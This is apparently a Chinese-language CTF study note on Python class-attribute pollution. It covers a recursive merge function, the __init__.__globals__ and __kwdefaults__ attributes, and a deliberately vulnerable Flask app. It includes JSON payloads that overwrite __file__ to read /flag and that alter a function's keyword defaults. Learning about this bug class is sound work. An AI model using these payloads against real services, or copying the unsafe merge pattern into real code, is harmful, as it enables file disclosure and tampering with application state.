## Python原型链

[TOC]

> 参考：https://tttang.com/archive/1876/#toc_osenviron（写的特别好）
>
> 类属性值的污染:
>
> 在python中不存在"原型链污染"应该，我们实现的角度是污染类属性，看了一些文章之后了解到，根据python的设计，也不是所有的类和所有属性可以污染的
>
> 我感觉跟JavaScript原型链的思路是一样的，同时又有点类似于ssti的变体

---

`merge` 函数

```python
def merge(src, dst):
    for k, v in src.items():
        print(f"k:{k}\t v:{v}")
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

> 这个函数就是递归实现，将`src`字典正确地合并到`dst`字典中(而不是简单地覆盖)

一个例子：

```python
import json

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

a = {'a': 1, 'b': {'c': 2, 'd': 3}}
b = {'a': 2, 'b': {'c': 3, 'e': 4}}
print(json.dumps(b, indent=4))
merge(a, b)
print()
print(json.dumps(b, indent=4))
```

```json
//原来b的值
{
    "a": 2,
    "b": {
        "c": 3,
        "e": 4
    }
}
//合并之后
{
    "a": 1,
    "b": {
        "c": 2,
        "e": 4,
        "d": 3
    }
}
```



### 几个概念

#### \__init__

`__init__`是特殊方法，用于对象初始化。当创建类的实例时，

`__init__`方法会被自动调用。这给了攻击者一个入口点，如果他们能够以某种方式控制`__init__`方法，那么就可以在对象创建时执行特定的代码。

####  \__globals__

> 每个函数都有一个 `__globals__` 属性，用于访问函数的全局作用域

```python
global_var = 42

def my_function():
    local_var = 10
    print("Inside my_function")

print(my_function.__globals__)
```

通过 `__globals__` 属性来访问函数的全局作用域

```python
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x000001A076A649D0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'E:\\py\\flaskProject\\json学习\\glo.py', '__cached__': None, 'global_var': 42, 'my_function': <function my_function at 0x000001A076B42DE0>}
```

> 全局作用域指的是在模块（即一个 `.py` 文件）的顶层定义的变量、函数、类等。这些对象在整个模块中都是可见的，可以被模块内任何函数或方法访问。

就是Python访问变量的时候现在局部找，找不到的话去全局找，并且全局作用域在整个程序运行周期都存在，在模块中都可见



#### \__globals__['global_var']

```python
global_var = 42

def my_function():
    print(global_var)

print(my_function.__globals__['global_var'])
# 输出: 42
```

只会输出全局变量

```
42
```



`keys()`

```python
print(my_function.__globals__.keys())
```

```python
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__', '__file__', '__cached__', 'global_var', 'my_function'])

```



利用这个属性来修改全局变量

```python
global_var = 42

def my_function():
    print(global_var)

my_function.__globals__['global_var'] = 100
my_function()
# 输出: 100
```



#### 存在无法污染的

如`Object`的属性就无法被污染

```python
payload = {
    "__class__" : {
            "__str__" : "hello"
        }
    }

merge(payload, object)
```

![image-20240929103913976](https://gitee.com/bx33661/image/raw/master/path/image-20240929103913976.png)



### 利用思路

就是需要代码审计到这个`merge函数`,让他能给到你可以污染的机会，

**我觉得关键在于两点**

- 我们要思考通过什么路径去污染，怎么构造一个链条
- 就是我们要污染谁，可以帮我绕过一些东西



1. 从全局变量修改
2. import模块里面了解项目结构，从别的模块里面污染
3. ...（还没做到）



### 看个例子

1. 

```python
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/', methods=['GET', 'POST'])
def hello_world():
    return open('/static/index.html', encoding="utf-8").read()

@app.route('/read', methods=['GET', 'POST'])
def Read():
    file = open(__file__, encoding="utf-8").read()
    return f"J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag(乐)
{file}
"

@app.route('/pollute', methods=['GET', 'POST'])
def Pollution():
    if request.is_json:
        merge(json.loads(request.data),instance)
    else:
        return "J1ngHong说：钥匙圣洁无暇，无人可以污染！"
    return "J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```

首先看到`merge` 函数就有了一些关注点

我们观察`/read`路由，他是可以读取后台文件的，

```python
 file = open(__file__, encoding="utf-8").read()
```

如果我污染改变`__file__`的话，就可以得到flag

```json
{
  "__init__": {
    "__globals__": {
      "__file__": "/flag"
    }
  }
}
```



#### 2. lucky_number

```json
{
    "__init__":{
        "__globals__":{
            "heaven":{
                "create":{
                    "__kwdefaults__":{
                        "lucky_number":5346,
                        "confirm":"true"
                    }
                }
            }
        }
    }
}
```

